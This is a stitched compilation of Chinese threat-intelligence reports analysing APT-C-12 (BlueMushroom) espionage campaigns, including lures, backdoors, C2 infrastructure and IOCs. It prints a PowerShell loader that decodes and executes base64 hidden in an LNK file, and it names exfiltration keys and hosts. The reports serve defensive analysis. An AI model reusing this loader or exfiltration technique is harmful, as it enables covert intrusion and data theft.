Poison Ivy母体会判断系统中是否有瑞星进程，如果有则会将Poison Ivy的ShellCode中注入默认浏览器的操作（在ShellCode的尾部）代码删除。 另外，母体还会判断是否有360、卡巴斯基、金山的进程，但通常只是做判断而不做后续操作。一个比较特殊的操作是：在核危机行动2013-2014版的Poison Ivy中，木马一旦发现系统中有360、卡巴斯基等杀软存在，就会用ICMP协议发送一条固定数据到一个指定的服务器。这条固定数据如下： “!"#$%&'()*+,-./0123456789:;<=>?”
（2）反虚拟机技术
我们在核危机行动的多个代码中，都发现了一个特殊的导出函数 szFile。导出函数 szFile 是一个104字节大小的字符串数组，运行的时候会动态填写字符串“VirtualAlloc”，并动态修改PE中导出表的大小为“0X80000000”，这样调用 GetProcAddress(handle,""szFile") 的时候会返回 VirtualAlloc 的地址，这样可以对抗轻量级的虚拟机。
（五）插件分析
我们截获了很多核危机行动的功能插件，疑似是Bfnet的其他功能插件，或者通过Bfnet下放的其他恶意程序。相关插件工具都是攻击者对被感染机器进行筛选后进一步定向投放的，不同目标存在的插件工具不同。 相关插件工具主要是进一步探测用户环境和窃取指定用户文件，整体偏向横向移动的作用。下图给出了部分插件及其作用分析。
（1）NSSDZL.vbs
该文件是由ENSSDZL.vbs文件释放出来，NSSDZL.vbs的主要功能是将指定文件（通过指定文件扩展名）拷贝到指定目录（usb_tmp）。相关文件扩展名包括：PDF，DOC，DOCX，XLS，XLSX，PPT，PPTX，WPS，ET，DPS，7Z，ZIP，RAR
（2）NWSM.vbs
NWSM.vbs是由ENWSM.vbs释放。NWSM.vbs功能最为复杂，包含内网渗透，并且通过流试方式写入脚本。
（3）C0A80101.vbs等其他9个同类脚本
这些脚本会查看局域网其他IP（手动指定）的NetBIOS信息，包括计算机名、MAC地址；查看远程计算机服务及状态；将批处理文件通过流试方式写入到：“当前文件名”.tmp:smzl.dat。
（4）rar.bat等其他7个同类脚本
使用rar.exe打包加密指定目录的制定扩展名文件，包括：doc、docx、pdf、pptx、ppt、xls、xlsx等，密码为1q2w3e4r5t，按照2M的大小分割，打包到“%temp%\360scanA248DDEGB GC.log（其中， 是2个数字）”中，并且设置"%temp%"目录下的.log和.rar为隐藏属性。
（5）jhm.exe
这是一个攻击者自己开发的截图工具，截图到"%temp%"目录或当前目录下，命名为2ce605ed.tmp或2ce605ed.bmp（不同版本路径不同，但文件名相同，有的需要JHM.vbs配合移动文件到%temp%目录）。 PDB路径：C:\Users\Lab08612\Documents\Visual Studio 2012\Projects\ c++ print screen\Release\cprintscreen.pdb
（6）otb.exe
这个插件的功能主要是盗取Outlook密码。一种方式是输出Outlook密码到控制台（无需参数），一种方式是输出Outlook密码到指定文件（需要参数：-f + 文件路径）
三、 C&C分析
核危机行动在不同的时期选择的C&C（控制服务器）有较大变化。在2011-2012年期间主要以动态域名为主，动态域名服务商的选择是以境外ChangeIP为主；从2013年开始逐渐转为直接访问指定IP，Bfnet两个版本的后门均访问指定IP，而不再通过域名解析IP。 截止2018年5月，360追日团队共截获核危机行动相关C&C服务器动态域名20余个，固定IP地址20余个。在动态域名中，ChangeIP域名占82.4%，DynDNS域名占11.8%，其他占5.9%。 核危机行动所采用的域名，很多还具有明显的含义，如360、土豆、新浪等知名网站域名都被用来做了动态域名的注册子域名。如： 视频类 Youtube、tudou 购物类 Tmall 手机类 android23、iphone5 互联网综合类 360sc2、sohu、sogou、sina、baidu2 以下是核危机行动中所使用的部分指定IP： 韩国：210. _._ .90、210. _._ .90 美国：162. _._ .33、173. _._ .200 加拿大：63. _._ .25 巴西：200. _._ .22 瑞典：95. _._ .37 还有一点值得注意的是，在目前已经截获的核危机行动的RAT中，部分RAT会内会内置两个IP，其中一个IP是专门用来迷惑分析人员的。
附录1 360追日团队（Helios Team）
360 追日团队（Helios Team）是360公司高级威胁研究团队，从事APT攻击发现与追踪、互联网安全事件应急响应、黑客产业链挖掘和研究等工作。团队成立于2014年12月，通过整合360公司海量安全大数据，实现了威胁情报快速关联溯源，独家首次发现并追踪了三十余个APT组织及黑客团伙，大大拓宽了国内关于黑客产业的研究视野，填补了国内APT研究的空白，并为大量企业和政府机构提供安全威胁评估及解决方案输出。
附录2 360安全监测与响应中心
360安全监测与响应中心，是360为服务广大政企机构而建立的网络安全服务平台，旨在第一时间为政企机构提供突发网络安全事件的预警、通告，处置建议、技术分析和360安全产品解决方案。突发网络安全事件包括但不限于：安全漏洞、木马病毒、信息泄露、黑客活动、攻击组织等。 360安全监测与响应中心兼具安全监测与响应能力：中心结合360安全大数据监测能力与海量威胁情报分析能力，能够全天候、全方位的监测和捕获各类突发网络安全事件；同时，基于10余年来为全国数万家大型政企机构提供安全服务和应急响应处置经验，中心能够在第一时间为政企机构应对突发网络安全事件提供有效的处置措施建议和应急响应方案。 在2017年5月发生的永恒之蓝勒索蠕虫（WannaCry）攻击事件中，360安全监测与响应中心在72小时内，连续发布9份安全预警通告，7份安全修复指南和6个专业技术工具，帮助和指导全国十万余家政企机构应对危机。 A-TEAM是360安全监测与响应中心下属的一支专业技术研究团队，主要专注于 Web 渗透与APT 攻防技术研究，并持续展开前瞻性攻防工具预研，以提前探知更多的未知威胁、新兴威胁。A-TEAM的技术研究从底层原理、协议实现入手，能够深度还原攻与防的技术本质。
附录3 360威胁情报中心360公司在2018年7月5日首次对外公开了一个从2011年开始持续近8年针对我国政府、军工、科研、金融等重点单位和部门进行网络间谍活动的高级攻击组织-蓝宝菇（APT-C-12），该组织的活动在近几个月内呈现非常活跃的状态。本文作为前期组织揭露报告的补充，详述蓝宝菇组织在近期攻击活动的技术细节，希望安全业界了解其攻击手法共同完善拼图，输出防御方案联合起来对抗这个国家级的威胁。
2018年4月以来，360安全监测与响应中心和360威胁情报中心在企业机构的协同下发现了一批针对性的鱼叉攻击，攻击者通过诱导攻击对象打开鱼叉邮件云附件中的LNK文件来执行恶意PowerShell脚本收集上传用户电脑中的敏感文件，并安装持久化后门程序长期监控用户计算机。该攻击过程涉及一些新颖的LNK利用方式，使用了AWS S3协议和云服务器通信来偷取用户的敏感资料，在此我们分析并公开整个攻击过程。
360威胁情报中心确认多个政企机构的外部通信邮箱被投递了一份发自boaostaff[@]163.com的鱼叉邮件，钓鱼邮件仿冒博鳌亚洲论坛向攻击对象发送了一封邀请函：
邮件附件被放到163的云附件里，此附件即为攻击者的恶意Payload，这是一个通过RAR打包的快捷方式样本。接下来我们对同一波攻击中的另一个完全相同功能的样本进行详细分析，以梳理整个攻击过程。
附件内容如下：
一旦攻击对象被诱导打开该LNK快捷方式文件，LNK文件便会通过执行文件中附带的PowerShell恶意脚本来收集上传用户电脑中的敏感文件，并安装持久化后门程序长期监控用户计算机。
通过分析LNK文件格式中几个比较重要的结构，完整还原出样本真实执行的恶意目标，其中涉及3个LNK文件格式的重要结构：LinkTargetIDList、COMMAND_LINE_ARGUMENTS和EnvironmentVarableDataBlock。
CLSID_MyComputer\C:\Windows\system32\windOW~1\V1.0\POwersHELl.exe
通过调试可以看到目标路径和LinkTargetIDList拼接出来的结果一致：
样本中的目标程序参数则为具体需要执行的PowerShell恶意代码，另外由于在参数中包含了大量的不可显示Unicode字符，从而导致右键打开快捷方式时目标中并不会包含对应的PowerShell代码：
该值设置后会导致具体的快捷方式中的目标被设置为对应的EnvironmentVarableDataBlock值，但是需要注意的是，样本中EnvironmentVarableDataBlock对实际的程序调用并不起作用（删除并不影响最终的样本启动），最终Shell32.dll靠解析LInkTargetIDList数组来启动PowerShell。
将LNK文件指向执行的PowerShell脚本解密，该PowerShell命名为ps_origin，代码如下：
-join$a=$host.ui.rawui.windowtitle; // 获取当前窗口的标题名
If(!$a.endswith('.lnk')) // 找到 lnk 文件
{$a+='.lnk'}
$a=gi $a; //Get-Item
q64 (gc $a|select -l 1); // 定位到最后一行， base64 解密并执行
Function q64
param($6);
iex ([text.encoding]::utf8.getstring([convert]::frombase64string($6)))}
q64 $o­C:\Windows\System32\shell32.dll
PowerShell脚本会定位执行LNK文件的最后一行，文件的最后一行如下：
被解密后的LNK文件最后一行中的PowerShell脚本中的ps_start会被首先执行，该PowerShell脚本主要用于解压出后续的压缩包，并继续运行其中的脚本，同时压缩包包含了相应的文件窃取模块，如下图所示脚本通过[convert]::frombase64string((gc $a|select -l 2|select -f 1)));以Base64解密出对应的压缩包文件，之后使用Rundll32加载其中beoql.g后门文件（加载函数为DllRegister），同时将一段PowerShell脚本作为参数传入，该PowerShell命名为ps_loader：
脚本获取基本信息后，再通过Rar.exe压缩为start.rar文件，之后使用RSA算法加密一个随机字符串e，秘钥如下：
<RSAKeyValue><Modulus>3w2Aa8octWRTs8/FhG9TxNHVOK+7L4RpX1iHY5mCkqbWwIomgpsEGvFqN3C9P1G/Yu+FV29BSlWHI6cUd7d8OK6AJD6vdF6uvoITVEsvPCkhwypZ+gbjkDirLGHI6wtTD4FF0X+EH7S6xBGqSHbOg+abDS3KlkMkwIzx5vhlbCUkckJFj31zmapLGIn4nTWybfP4nAhMuGGGvamXyQ+y4rrqTUPm1vU0GQh1zT2J9Ce204WubUlyhMMIhvAeOQ0TMKEVoCdU9yrRfj1rc36HYCO/RysGpKfx+mGcIWvPBXywXFuxEiGSqkk4jCf7Gh3eehfa98gmYuYChRP6CtoL8Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
该随机字符串为之后上传文件的RAR加密密码，脚本会将该加密后的字符保存成id.rar文件，并通过函数pv9上传start.rar及id.rar文件到攻击者的云服务器中：
最后脚本会遍历系统中指定的后缀文件（jpg,txt,eml,doc,xls,ppt,pdf,wps,wpp,et，只获取180天以内的文件），继续使用Rar.exe压缩获取的指定文件，密码为之前生成的变量e：
而函数pv9会将对应的RAR文件通过AWS S3 存储协议上传到一个网上的云服务商的地址：0123.nyc3.digitaloceanspaces.com，代码中包含的ACCESS_KEY和SECRET_KEY疑似亚马逊S3云服务存储协议所使用的相关KEY信息：
一次通信流程由上图代码红框中的函数ul3和ig3完成，其中ul3用于配置生成对应的请求头，ig3完成文件的上传。而ul3中用于封装请求，aws3对应的请求头如下图为其中的$9，其中一个重要的参数为Signature，由函数a53，e77共同生成，之后$9会封装到$g中，$g作为最终的请求头返回：
接着对返回数据进行简单的初始化后，通过函数sj8对数据进行解密，可以看到攻击者使用了whatthefuckareyoudoing这个极富外国色彩的调侃俚语作为秘钥：
上传下载的通信流量通过AES进行了处理，KEY为ps_loader中传入的Dqd6lfRDcXK2KxIFDqU1S/MMyxGJ7qPIwM/xZe0R6Ps=：
ps_start脚本会使用Rundll32.exe加载执行样本中解压出来的beoql.g后门文件，该DLL为一个实现恶意代码持久化加载的模块，用于加载ps_loader，并通过修改LNK文件来实现持久化，其导出的函数如下所示：
DllRegister
初始函数，用于保存传入的 PowerShell ，调用 DllEntry 启动 PowerShell ，调用 DllInstall 生成并启动用于修改系统 LNK 文件的 BAT 脚本
DllInstall
生成并启动用于修改系统 LNK 文件的 BAT 脚本
DllCanUnload
另外，ps_start中会直接调用该DLL的导出函数DllRegister，参数为对应的ps_loader脚本，函数首先会将ps_loader加密保存为beoql.g.ini，之后调用DllEntry和fun_Callinstall：
首先通过调用导出函数DllCopyClassObject将该LNK文件拷贝到临时目录，再通过函数DllSetClassObject修改%temp%目录下的LNK文件，最后将修改过的LNK文件拷贝覆盖回去：
具体效果如下所示，LNK快捷方式文件被修改为通过Rundll32.exe调用该DLL的DllEntry函数，该函数的主要功能如前文所示用于运行对应的ps_loader脚本，通过劫持LNK快捷方式文件来起到持久化的作用：
根据360网络安全研究院的全网数据抽样统计，对攻击者使用的两个云服务域名地址（子域名分别为0123和05011）的访问分别集中在4月和5月，这和我们捕获到的样本时间段完全一致，也就是说蓝宝菇APT组织在这两个月内使用本文描述的攻击方式进行了大量针对性的攻击：
由于恶意样本会将窃取的用户数据通过Amazon S3云存储协议上传到攻击者的云服务器中，360威胁情报中心通过对AWS S3服务通信机制的深入解析，结合样本分析得到的数据模拟通信成功获取部分攻击者攻击过程中产生的中间数据，其中包括攻击对象的计算机名、被攻击时间等信息。数据显示仅一天时间内就有数个受害人员的信息被上传到服务器，整波攻击活动期间评估受控人员数量在百级。
威胁情报在攻防对抗中发挥着越来越重要的作用，威胁情报不是简单的从blog、twitter等公开渠道获得开源情报。从本次事件中可以看出，只有具备扎实的安全能力、建立强大的数据基础并对威胁情报涉及的采集、处理、分析、发布、反馈等一系列的环节进行较长时期的投入建设，才能获得基于威胁情报的检测、分析、响应、预警等关键的安全能力。
目前，基于360威胁情报中心的威胁情报数据的全线产品，包括360威胁情报平台（TIP）、天眼高级威胁检测系统、360 NGSOC等，都已经支持对此APT攻击团伙攻击活动的实时检测和相关未知攻击的预警。
[1].https://github.com/minio/minio-py
[2].https://docs.minio.io/docs/python-client-quickstart-guide
[3].https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/dev/Introduction.html
[4].https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/API/sig-v4-authenticating-requests.html
[5].https://developers.digitalocean.com/documentation/spaces/#authentication
[6].http://developer.huawei.com/ict/cn/doc/Object_Storage_Service_API_zh_p/zh-cn_topic_0016616545.html摘要 从2011年开始持续至今，高级攻击组织蓝宝菇（APT-C-12）对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动。该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。 360追日团队捕获的首个蓝宝菇组织专用木马出现在2011年3月左右。目前已总共捕获该组织恶意代码670余个，其中包括60余个专门用于横向移动的恶意插件。目前已经发现该组织相关的C&C域名、IP数量多达40余个。 由于该组织相关恶意代码中出现特有的字符串（Poison Ivy密码是：NuclearCrisis），结合该组织的攻击目标特点，360威胁情报中心将该组织的一系列攻击行动命名为核危机行动（Operation NuclearCrisis），考虑到核武器爆炸时会产生蘑菇云，并结合该组织的一些其他特点及360威胁情报中心对APT组织的命名规则，我们将该组织名为蓝宝菇。 截止2018年5月，360追日团队已经监测到核危机行动攻击针对的境内目标近30个。其中，教育科研机构占比最高，达59.1%，其次是政府机构，占比为18.2%，国防机构排第三，占9.1%。其他还有事业单位、金融机构制造业等占比为4.5%。 第一章 综述 从2011年开始持续至今，高级攻击组织蓝宝菇（APT-C-12）对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动。该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。 360追日团队捕获的首个蓝宝菇组织专用木马出现在2011年3月左右。目前已总共捕获该组织恶意代码670余个，这些恶意代码可分为4类RAT，细分版本为7种。其中，还包括60余个专门用于横向移动的恶意插件，从功能区分来看也至少有5种。目前已经发现该组织相关的C&C域名、IP数量多达40余个。 由于该组织相关恶意代码中出现特有的字符串（Poison Ivy密码是：NuclearCrisis），结合该组织的攻击目标特点，360威胁情报中心将该组织的一系列攻击行动命名为核危机行动（Operation NuclearCrisis），考虑到核武器爆炸时会产生蘑菇云，并结合该组织的一些其他特点及360威胁情报中心对APT组织的命名规则，我们将该组织名为蓝宝菇。 在核危机行动针对中国的网络间谍活动中，下述相关时间点值得关注： 2011年3月，首次发现与该组织相关的木马，针对政府相关机构进行攻击。 2011年11月，对某核工业研究机构进行攻击。 2012年1月，对某大型科研机构进行攻击。 2012年3月，对某军事机构进行攻击。 2012年6月，对国内多所顶尖大学进行攻击。 2013年6月，对某中央直属机构进行攻击，同时开始使用新类型的RAT。 2014年8月，发现该组织使用5种以上的横向移动恶意代码针对重点目标机构进行大量横向移动攻击。 2014年12月，发现新的RAT，我们将其命名为Bfnet，该后门具备窃取指定扩展名文档等重要功能。 2015年9月，针对多个国家的华侨办事机构进行攻击。 2018年4月，针对国内某重要敏感金融机构发动鱼叉邮件攻击。 注：以上所述的“首次发现”时间，仅是我们目前已经了解掌握的情况，不代表我们已经掌握了该组织的全部攻击事件和行为。 第二章 攻击目的和受害分析 一、 行业分布 截止2018年5月，360追日团队已经监测到核危机行动攻击的境内目标近30个。其中，教育科研机构占比最高，达59.1%，其次是政府机构，占比为18.2%，国防机构排第三，占9.1%。其他还有事业单位、金融机构制造业等占比为4.5%。 二、 地域分布 中国北京地区是核危机行动攻击的重点区域，其次是上海、海南等地区。 第三章 持续的网络间谍活动 一、 初始攻击 在核危机行动的多次攻击中，我们发现其初始攻击主要采用鱼叉邮件携带二进制可执行文件这种攻击方法。攻击者仿冒官方邮件向受害者发送鱼叉邮件，诱导受害者点击邮件所携带的恶意附件。 RLO伪装文档扩展名 在攻击的初期，攻击者使用的邮件附件多为一个WinRAR压缩包，其中包含伪装成Word文档的SCR文件。 下图为核危机行动鱼叉邮件压缩包中的一个伪装成Word文件的专用木马的图标和文件名截图。该文件伪装成一份通信录文件，同时，为了更好的伪装诱饵文档，攻击者使用了RLO控制符。RLO控制符是Unicode控制符的一种，用来显示中东文字，中东文字的书写顺序是从右到左的。攻击者通过在文件名中插入RLO控制符，使得字符的显示顺序变成从右至左，从而来隐藏文件的真实扩展名。
MD5 文件名 病毒名
a2c*************************7dcf
****工硕班通讯录RCS.DOC（真实扩展名.SCR） Dropper.Win32.FakeDoc
表1 核危机行动伪装成通讯录的专用木马1 当受害者点击打开这个伪装成Word文档的专用木马后，木马会在释放攻击代码的同时，释放一个真正的Word文档。下图为该诱饵Word文档打开后的信息内容，其中信息确实是一份详细的通讯录。可见，该组织在文件伪装方面确实下足了功夫。 下面是我们截获的另外一个使用了RLO伪装，同时伪装成通讯录的专用木马样本信息及该样本打开后的截图。
MD5 文件名 病毒名
e26** ** ** ** * ********** ****** 65f0
第六组通讯录更新SRCS.DOC（真实扩展名.SCR） Dropper.Win32.FakeDoc
表2 核危机行动伪装成通讯录的专用木马2 下面是我们截获的第三个使用了RLO伪装的专用木马样本信息及该样本打开后的截图。该文件的文件名格式伪装方法与前述两个样本相同，但具体内容则伪装成了一份智库文件。
MD5 文件名 病毒名
e26 ** ** ** ** * ********** ****** 65f0 《智库》SRCS.DOC（真实扩展名.SCR） Dropper.Win32.FakeDoc背景 继360公司披露了蓝宝菇(APT-C-12)攻击组织的相关背景以及更多针对性攻击技术细节后，360威胁情报中心近期又监测到该组织实施的新的攻击活动，本文章是对其相关技术细节的详细分析。
样本分析 诱饵文件 在APT-C-12组织近期的攻击活动中，其使用了伪装成"中国轻工业联合会投资现况与合作意向简介"的诱导文件，结合该组织过去的攻击手法，该诱饵文件会随鱼叉邮件进行投递。
如下图所示该诱饵文件伪装成文件夹的图标，执行后会打开包含有诱饵文档和图片的文件夹，而此时实际的恶意载荷已经在后台执行。
当该诱饵文件运行时，其会解密释放4个文件，其中两个为上述的诱导文档和图片，另外为两个恶意的tmp文件。
释放的恶意tmp文件路径为：
%temp%\unicode32.tmp
%appdata%\WinRAR\update.tmp
最后通过LoadLibraryW加载释放的unicode32.tmp文件。
unicode32.tmp
unicode32.tmp为一个loader，其主要用于加载update.tmp，如下图所示其通过rundll32.exe加载update.tmp，并调用其导出函数jj。
当加载了update.tmp后，会删除装载exe程序文件和自身。
update.tmp 该文件为一个DLL,并有一个名为jj的导出函数。
其首先会对目标主机进行信息收集。
获取系统版本信息
调用CreateToolhelp32Snapshot获取系统进程信息。
调用GetAdaptersInfo获取网卡MAC地址。
判断当前系统环境是32位或64位。
通过注册表获取已安装的程序信息，获取的安装程序信息加上前缀”ISL”格式化。
通过注册表获取DisplayName和DisplayVersion的信息，并将DisplayName 和DisplayVersion格式化为”%s”:{“ND”:”%s”,”DV”:”%s”}。
信息收集后会首先向远程控制服务器发送上线信息。
获取tmp目录, 创建AdobeNW目录,并从控制服务器上下载AdobeUpdate.tmp作为第二阶段的载荷，其实际为一个DLL文件。
最终调用rundll32启动DLL文件的导出函数MainFun,如果进程创建成功给服务器返回信息。
AdobeUpdate.tmp AdobeUpdate.tmp为DLL文件，其导出方法MainFun由第一阶段木马DLL调用执行。
其首先遍历%USERPROFILE%\\AppData路径下tmp后缀文件，并删除。
然后从文件自身尾部读取配置信息并解密，其格式如下：
加密的配置信息，包括标识ID，控制服务器地址，加密IV和KEY，以及Mutex信息；
4字节加密配置信息长度；
17字节解密密钥；
例如上图所示的解密配置文件的KEY为sobcsnkciatwiffi，其解密算法如下。
解密之后的配置文件如下所示。
查询HKEY_CURRENT_USER下的MyApp注册表查看是否有FirstExec, 通过字符串”no”来判断该DLL是否是第一次执行。
若DLL不为首次执行，则轮询获取控制服务器命令，否则遍历磁盘C：到F：中的文档文件信息，并保存在temp文件夹下的list_tmp.txt中。
其中查找的文档类型包括.ppt .pptx .pdf .xls .xlsx .doc .docx .txt .wps .rtf的文档，将文档文件路径、创建时间以及文件大小信息进行保存。
下图为示例的写入数据格式(文件路径 创建时间 文件大小):
并将list_tmp.txt进行aes加密后上传到控制服务器。
接着设置注册表FirstExec标志。
AdobeUpdate.dll木马实现了丰富的命令控制指令，其通过访问控制域名获取包含有控制命令的文件，并在本地解密解析后执行。
其指令以***和对应指令数字组成，以下为控制指令功能列表。
***1 执行cmd命令
***2 更新AppName配置
***3 文件上传
***4 文件下载
***5 更新控制域名
***7 上传文档文件列表信息
***8 执行dll文件或exe
***9 文件删除
***10 指定文件列表信息上传
***11 保留
控制基础设施 APT-C-12组织近期活动中使用的恶意代码利用了applinzi.com域名下的二级域名作为控制域名，该域名为Sina App Engine的云服务托管。
我们测试注册了SAE的账户，其默认创建应用可以免费使用十多天，并支持多种开发语言的环境部署。
我们尝试对其控制服务器进行连接，但其后台处理程序已经出错，通过返回的错误信息我们可以发现该组织使用Python部署的后台应用，并使用了flask作为其Web服务实现。
SAE控制协议 该组织针对SAE的部署应用实现了一套访问协议，其分为put，info，get，del四个功能。
其中put用于上传文件：
get用于获取文件：
info用于获取信息：
del用于删除文件：
总结 继360威胁情报中心发现该组织利用Digital Ocean云服务作为命令控制和回传通信渠道以后，我们又发现该组织使用国内的云服务SAE构建其控制回传基础设施，利用这种方式一定程度上减少了攻击利用的成本，也增加了分析回溯的难度。
IOC crecg.applinzi.com
costbank.applinzi.com
参考链接 https://sae.sina.com.cnTAG ：高级可持续攻击、APT、BlueMushroom、Bfnet、PowerShell、蓝宝菇、亚太
TLP ：白 (对报告转发及使用不受限制)
日期 ：2018-11-14
BlueMushroom又名“蓝宝菇”，具备地缘政治背景，自2011年开始活跃，长期针对我国政府、教育、海洋、贸易、军工、科研和金融等重点单位和部门开展持续的网络间谍活动。
本报告内容主要包含BlueMushroom组织分析，其最新活动分析，以及首次公开的该组织近年的攻击活动。部分发现如下：
根据微步在线威胁情报云，BlueMushroom持续活跃，最近于2018年11月初前后发起过多次攻击，受害者包含APEC等大型会议相关目标。
BlueMushroom经常使用各种会议、智库和期刊的采访和约稿等作为诱饵，以伪装成文件夹和Word文档的可执行文件，以及包含PowerShell脚本的LNK文件作为木马投递载体。其目的是窃取目标机器上的jpg、txt、eml、doc*、xls*、ppt*、pdf、wps、wpp和et格式文件，和进一步的渗透。
2015年至今，BlueMushroom主要使用自己开发的后门进行攻击，该后门的一大特征是会删除WPS相关组件程序，以及通过修改LNK文件实现持久化。
BlueMushroom比较关注亚太政治，北京和上海等地是其重点关注地区。综合分析其攻击目标，木马工具等信息，判断BlueMushroom可能具备亚太地缘政治背景。
微步在线通过对相关样本、IP和域名的溯源分析，共提取11条相关IOC，可用于威胁情报检测。微步在线的威胁情报平台（TIP）、威胁情报订阅、API等均已支持此次攻击事件和团伙的检测。
微步在线长期跟踪全球150多个黑客组织，其中包含多个长期针对我国进行攻击的APT组织。近期，微步在线监测到具备地缘政治背景的APT组织BlueMushroom针对我国的多起攻击活动。在具体的攻击（多为鱼叉式网络钓鱼）中，BlueMushroom一般会制作与目标高度相关的诱饵，利用伪装成文件夹和Word文档的可执行文件，以及包含PowerShell脚本的LNK文件作为木马投递载体。
2018年10月底至11月初，微步在线监测到BlueMushroom针对我国发起了多次定向攻击，其中受害者包含APEC等大型会议相关目标。以针对APEC相关目标的攻击为例，攻击者使用伪装为文件夹的可执行文件作为木马投递载体，运行后会释放内容为Chile APEC 2019日程相关的图片作为诱饵，以及多个DLL和配置文件。
图：诱饵文件夹内容
综合分析木马编译时间，诱饵文件创建修改时间，以及首次发现时间等信息，判断此次攻击发生在10月底，潜在被攻击目标为出席APEC会议的政府领导和工商企业人士。更进一步分析发现，近几年，BlueMushroom基本每年都会在10月底以APEC为诱饵发起一波攻击，这可能是由于每年APEC领导人非正式会议将于11月中旬举行。下图为2016年10月底 APEC相关攻击活动中使用的诱饵。
BlueMushroom善于利用社工手法进行钓鱼攻击，制作的诱饵也与被攻击目标高度相关。在历年的活动中，BlueMushroom多次利用各种智库和政治类期刊的“约稿”和“采访”，以及各种会议作为诱饵进行定向攻击。比如，BlueMushroom曾假借《当代亚太》编辑部编辑任娜的名义进行钓鱼，针对研究亚太安全与军控的专家进行定向攻击；以及以《国家智库》的名义，针对某教授进行定向攻击等等。
下表为2015年以来微步在线独家发现的BlueMushroom组织的部分攻击活动。
2017年8月
以“《太平洋学报》征稿启事”，“运筹优化软件GAMS及CGE模型核心技术与应用培训”等为诱饵，针对研究海洋、社会科学和国际关系的专家学者，以及金融和经济等企事业单位技术骨干、科研院所研究人员以及高校教职工等目标发起定向攻击；
以北京大学国际战略研究院院长王缉思批注的人大国发院针对“一带一路”的对策建议为诱饵，定向攻击国内顶级智库相关目标。
在2016年的一次攻击中，攻击者以“京卡-互助服务卡”为诱饵，疑似针对北京理工大学教职工发起定向攻击。分析诱饵文档的元数据，发现文档为“刘明奇”创建，此人系中国教育工会北京理工大学委员会常务副主席，在2016年确实有从事相关工作（推动本校工会系统服务平台建设）。推测此文档应是攻击者窃取而来。京卡·互助服务卡原名“职工互助服务卡”，是北京推出的一种维护职工权益的智能卡，持卡人可享受免费保险、优惠逛公园、看电影等12项服务。
包含诱饵的木马文件图标：
诱饵文档内容：
图：京卡-互助服务卡
2017年8月前后，攻击者以“《太平洋学报》征稿启事”为诱饵（内容是从《太平洋学报》网站复制），针对研究海洋、社会科学和国际关系的专家学者发起定向攻击。《太平洋学报》关注太平洋区域政治、经济、海洋、文化以及国际关系。相关木马伪装成文件夹，双击后会释放并打开，其中包含两个诱饵文件。
诱饵文件内容：
2017年8月中上旬，以中国管理科学研究院人才战略研究所举办的“运筹优化软件GAMS及CGE模型核心技术与应用”培训为诱饵，针对金融和经济等企事业单位技术骨干、科研院所研究人员以及高校教职工等目标发起定向攻击。
相关木马亦伪装成文件夹，双击后会释放并打开，其中包含两个诱饵文件。
诱饵文件内容：
根据公开情报，在早期（2011-2014）的活动中，BlueMushroom主要使用公开的Poison Ivy的木马进行攻击，从2014年末至今，较多使用自己开发的Bfnet后门。Bfnet属DLL后门，主要通过伪装成Word文档、文件夹以及其他方式进行投递，其显著特点是运行后会删除WPS相关程序和修改LNK文件实现持久化。
最新样本分析
下面以Chile_Apec2019.exe为例进行分析。
1.该样本基本信息如下：
a) 对于大写字母，如码点值大于等于0x4A，则将码点值-9，否则将码点值+17；
b) 对于小写字母，如码点值大于等于0x6A，则将码点值-9，否则将码点值+17；
c) 对于数字，如码点值大于等于0x39，则将码点值-9，否则将码点值+1;
d) 将空格（0x20）和大于号（0x3E）对调；
e) 以竖线（0x7C）作为字符串结束符。
2）一些与样本功能无关的API调用。
样本在一些函数中加入了无关的API调用，如在DxEntry导出函数中加入了GetCurrentProcess()、GetConsoleWindow()和GetCapture()调用。
3）生成批处理文件。
a)样本会收集下列目录中的快捷方式文件名。
c) 最后样本会向批处理文件中写入调用DxSetClassObject感染快捷方式的命令，在生成批处理文件之后，样本通过CreateProcessW调用cmd.exe来启动批处理文件。
4) 感染快捷方式文件。
样本首先会通过CoCreateInstance创建一个IShellLinkW对象，然后拼接多个命令字符串，最后通过IShellLinkW对象提供的接口将这些内容写入快捷方式。
样本中硬编码了另一个8字节的KEY （0x37 0x43 0x18 0x95 0x47 0x69 0x13 0x68），该KEY与CONFIG-KEY做循环异或后得到的结果才用于解密过程。
解密后的配置文件数据部分如下图和下表所示，C2数据之间使用换行符\n（0x0A）进行分割。
6) 后门功能。
样本通过一个定时器（SetWaitableTimer）来定期触发，时间间隔由配置文件指定（0x20 = 32秒）。随后定时器会尝试逐个回连C2列表中的服务器，并将"HELLO "和密钥字节流拼接，作为握手包发送。如成功建立连接，则C2服务器会回复"!HELLO"以及多个后续命令，相关命令及执行的操作如下：
历年样本对比
从代码结构来看，BlueMushroom自己开发的Bfnet大致可以分为两大版本。较旧的版本编译时间在2014年左右，没有使用任何的字符串加密算法，各种特征也较为明显。2015年之后的Bfnet样本开始使用“循环移位 + 替换”的字符串加密算法，并且开始注重修改代码中的静态特征，修改了原本的User-Agent字符串和互斥量名称等等，之后的样本（2017~2018）整体上来说变化不大，只做了一些微小的改动，配置解密算法更是始终未变。
2018年上半年捕获到的BlueMushroom样本有使用PowerShell脚本取代Bfnet后门核心功能的趋势，但在最近捕获的样本中又恢复了原本的做法，即在DLL文件中实现后门功能。
详细对比如下：
为方便进行跟踪，微步在线将该组织称为BlueMushroom。根据BlueMushroom在攻击中使用的木马工具，网络资产和攻击手法等信息，确定该组织也即“蓝宝菇”组织。
微步在线对BlueMushroom的TTP和历年攻击活动进行了系统的分析，有如下发现：
1. 发现该组织在发起攻击之前一般会经过一段时间的精心准备，有时准备时间长达两个月。
2. 该组织攻击手法和私有木马这几年变化均不大，但也在寻求着改变。自活跃以来，该组织主要使用伪装Word文档和文件夹等的PE文件作为载体投递后门木马。在2018年的几次攻击中，该组织开始尝试将部分诸如窃取文档等核心功能转移到使用PowerShell脚本实现，其策略也更倾向于LotL策略，这也是当前APT攻击的一大趋势。
